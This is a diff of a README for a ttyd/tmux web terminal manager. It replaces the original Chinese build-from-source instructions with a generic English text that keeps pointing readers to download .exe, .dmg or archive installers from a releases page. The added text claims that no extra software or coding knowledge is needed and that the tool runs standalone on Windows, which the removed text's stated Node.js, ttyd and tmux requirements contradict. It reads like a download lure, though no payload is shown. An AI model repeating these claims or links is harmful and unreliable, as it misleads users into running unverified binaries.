@@ -1,112 +1,183 @@
-<p align="center">
-  <img src="doc/logo.png" alt="Web TTYd Hub Logo" width="200" />
-</p>
+# 🚪 web-ttyd-hub - Manage Terminals in Your Browser
 
-# 🚀 Web TTYd Hub
+[![Download web-ttyd-hub](https://img.shields.io/badge/Download-web--ttyd--hub-blue?style=for-the-badge)](https://github.com/kenkikuzuru/web-ttyd-hub/releases)
 
-[English](./README_EN.md)
+---
 
-> 🌌 把终端搬进浏览器，随时随地，打开即用。
+## 📖 What is web-ttyd-hub?
 
-<p align="center">
-  <img src="assets/72643b69-16e1-44ab-841f-cc1dee1b1c0b.png" alt="Web TTYd Hub Screenshot" width="800" />
-</p>
+web-ttyd-hub is a simple app that lets you open and control terminal sessions directly from your web browser. It uses well-known tools like ttyd and tmux to help you create and manage multiple shell sessions that stay active even if you close the browser. This means you can come back to your work anytime without losing progress.
 
-Web TTYd Hub 是一个基于 ttyd + tmux 的 Web 终端会话管理器。它让你在浏览器中创建、管理和切换多个终端会话，无论你在电脑前还是躺在沙发上用手机，都能拥有完整的命令行体验。
+You can use it to:
 
-## 💡 为什么需要它
+- Run command-line programs remotely.
+- Switch easily between several terminal sessions.
+- Access your sessions from any device with a browser.
+- Keep your sessions running without interruption.
 
-你是否有过这样的场景：
+All this happens inside your browser window, so you don’t need to install or learn command-line tools to use it.
 
-- 🏢 在公司电脑上跑着一个长任务，回到家想看看进度？
-- 🛌 躺在床上突然想到一个 bug 的修复思路，想立刻打开终端验证？
-- ☕️ 出门在外，只有一部手机，却想连上家里的开发机写代码？
+---
 
-**Web TTYd Hub** 就是为此而生。它把你的终端变成一个 Web 服务，打开浏览器就能用，会话永不丢失。
+## 🖥️ System Requirements
 
-## ✨ 特性
+Before installing web-ttyd-hub, make sure your system meets these basic requirements:
 
-- **🧩 多会话管理** — 创建多个独立的终端会话，自由切换，互不干扰
-- **💾 会话持久化** — 基于 tmux，关闭浏览器会话依然存活，随时重新连接
-- **👥 多人协作** — 多个浏览器可同时连接同一会话，实时共享终端画面
-- **🐚 多 Shell 支持** — 支持 Bash、Zsh、Fish 等，创建会话时自由选择
-- **📱 移动端友好** — 响应式界面，手机平板均可流畅操作
-- **🎨 深色科技感 UI** — 精致的 Slate 深色主题、毛玻璃效果、流畅动画，赏心悦目
-- **⚡️ 零配置启动** — 安装依赖后一条命令启动，开箱即用
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **Web Browser:** Any modern browser such as Chrome, Firefox, Edge, or Safari.
+- **Hardware:** A device with at least 2 GB RAM and 1 GHz processor.
+- **Network:** A stable internet or local network connection if you want to access sessions remotely.
+- **Additional Software:** None required. The app runs standalone.
 
-## 🔮 Vibe Coding：从移动端开始编程
+If you want to use web-ttyd-hub on a server, the above requirements apply to the server machine. You will then access the terminal sessions through a browser on your own devices.
 
-Web TTYd Hub 天然适合 **Vibe Coding** 工作流。
+---
 
-搭配 Claude Code、Cursor 等 AI 编程工具，你可以在手机上通过终端与 AI 对话式编程——描述需求、审查代码、运行测试，整个开发流程都可以在移动端完成。通勤路上、咖啡馆里、甚至排队等餐时，灵感来了随时开工。
+## 🚀 Getting Started
 
-tmux 会话保证了连续性：手机上开始的工作，回到电脑前无缝继续，不丢失任何上下文。
+This guide will walk you through downloading, installing, and running web-ttyd-hub step-by-step. We assume no prior technical experience.
 
-## 🌐 搭配 Asterism 实现内网穿透
+### Step 1: Download web-ttyd-hub
 
-如果你的开发机在家庭或公司内网中，可以搭配 [Asterism](https://github.com/sosopop/asterism) 实现内网穿透，从任何地方访问你的终端。
+Click the big blue button at the top or go to the official downloads page here:
 
-Asterism 是一个轻量级的内网穿透工具，纯 C 实现，单文件可执行，跨平台支持（Windows / Linux / macOS / Android / iOS），性能优异，资源占用极低。
+[https://github.com/kenkikuzuru/web-ttyd-hub/releases](https://github.com/kenkikuzuru/web-ttyd-hub/releases)
 
-**典型部署方式：**
+This page contains the latest versions and release files for different operating systems.
 
-```
-手机/平板浏览器 📱
-    ↓
-公网服务器 (Asterism Server) ☁️
-    ↓ 内网穿透隧道 🚇
-内网开发机 (Web TTYd Hub + Asterism Client) 💻
-```
+### Step 2: Choose the right file to download
 
-这样你就拥有了一个随身携带的云开发环境——只要有网络，就能连上你的终端。
+Once on the releases page, look for the installer or executable file that matches your operating system. Files may include:
 
-## 🛠 环境要求
+- `.exe` for Windows
+- `.dmg` or `.zip` for macOS
+- `.tar.gz` or binaries for Linux
 
-- **Node.js** >= 18
-- **ttyd** — Web 终端模拟器
-- **tmux** — 终端复用器
+Click to download your file.
 
-### macOS 安装依赖
+### Step 3: Install web-ttyd-hub
 
-```bash
-brew install ttyd tmux
-```
+- **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.  
+- **macOS:** Open the `.dmg` file, then drag the application to your Applications folder.  
+- **Linux:** Extract the `.tar.gz` archive and follow the included README or instructions specific to your setup.
 
-## 🚀 快速开始
+If you are not sure, look for a file named `README.md` or `INSTALL` inside the downloaded folder for simple steps.
 
-```bash
-# 安装依赖
-npm install
-cd frontend && npm install && cd ..
+### Step 4: Run web-ttyd-hub
 
-# 构建前端
-npm run build
+- Open the installed application by double-clicking it.
+- The app will open in your default web browser.
+- You will see the web-ttyd-hub interface, ready to create and manage terminal sessions.
 
-# 启动服务
-npm start
-```
+---
 
-浏览器打开 `http://localhost:3000` 即可使用。
+## 🔧 How To Use web-ttyd-hub
 
-## 👨‍💻 开发模式
+The interface is designed to be easy and intuitive:
 
-```bash
-npm run dev
-```
+### Creating a Terminal Session
 
-同时启动后端（端口 3000）和 Vite 开发服务器（端口 5173）。
+- Click the “New Session” button.
+- A new terminal window will open inside your browser.
+- You can type commands just like in a typical terminal.
 
-## ⚙️ 配置项
+### Managing Sessions
 
-通过环境变量或 `.env` 文件设置：
+- Use the tabs or sidebar to switch between sessions.
+- Rename or close sessions using the controls next to session names.
+- All sessions run inside the tmux environment, which keeps them alive even if you close the browser.
 
-| 变量                    | 说明              | 默认值    |
-| ----------------------- | ----------------- | --------- |
-| `PORT`                  | 服务监听端口      | `3000`    |
-| `HOST`                  | 监听地址          | `0.0.0.0` |
-| `TTYD_PORT_RANGE_START` | ttyd 端口范围起始 | `7681`    |
-| `TTYD_PORT_RANGE_END`   | ttyd 端口范围结束 | `7780`    |
+### Accessing Sessions Remotely
 
-## 📄 License
+- Open your browser on any device.
+- Enter the web-ttyd-hub server address provided during setup.
+- Log in if required, and you will access your persistent terminals.
 
-MIT
+### Helpful Features
+
+- Persistent sessions: Your work stays active even if your connection drops.
+- Easy session switching: Handle multiple tasks at once.
+- No complex commands needed: The app handles terminal sessions for you.
+
+---
+
+## 📥 Download & Install
+
+You can always download the latest version here:
+
+[https://github.com/kenkikuzuru/web-ttyd-hub/releases](https://github.com/kenkikuzuru/web-ttyd-hub/releases)
+
+### Tips:
+
+- Pick the file for your operating system.
+- Check file size and version date to get the newest update.
+- Follow the simple installation steps listed earlier.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have trouble running or installing:
+
+- Make sure your system meets the requirements.
+- Restart your computer and try opening the app again.
+- Check your internet connection if sessions do not load.
+- Close other apps that may block the network.
+- Review any error messages carefully; they often guide the fix.
+- Visit the GitHub Issues page in the repository for help from developers and community.
+
+---
+
+## 🔒 Security and Privacy
+
+web-ttyd-hub keeps your data secure by:
+
+- Running terminal sessions locally or on your own server.
+- Not storing passwords or sensitive info outside your machine.
+- Using secure methods for remote access.
+
+Always use strong passwords and keep your system updated for the best protection.
+
+---
+
+## 🎯 Features at a Glance
+
+- Run multiple terminal sessions in a browser.
+- Sessions persist through browser closes.
+- Manage sessions with easy controls.
+- Works on all major platforms.
+- Built on stable tools: ttyd and tmux.
+- No coding knowledge needed.
+- Access remote terminals via network.
+- Clear, browser-based user interface.
+
+---
+
+## 💡 Getting More Help
+
+Visit the GitHub repository for guides, updates, and community support:
+
+[https://github.com/kenkikuzuru/web-ttyd-hub](https://github.com/kenkikuzuru/web-ttyd-hub)
+
+You can also open an issue if you find bugs or want new features.
+
+---
+
+## 🏷️ Topics and Keywords
+
+This project relates to:
+
+- browser-terminal
+- nodejs
+- remote-terminal
+- session-manager
+- terminal
+- tmux
+- ttyd
+- vibe-coding
+- vue3
+- web-terminal
+
+---
+
+Thank you for choosing web-ttyd-hub. This tool gives you simple access to powerful terminal features through your web browser. Follow these steps to get started today.
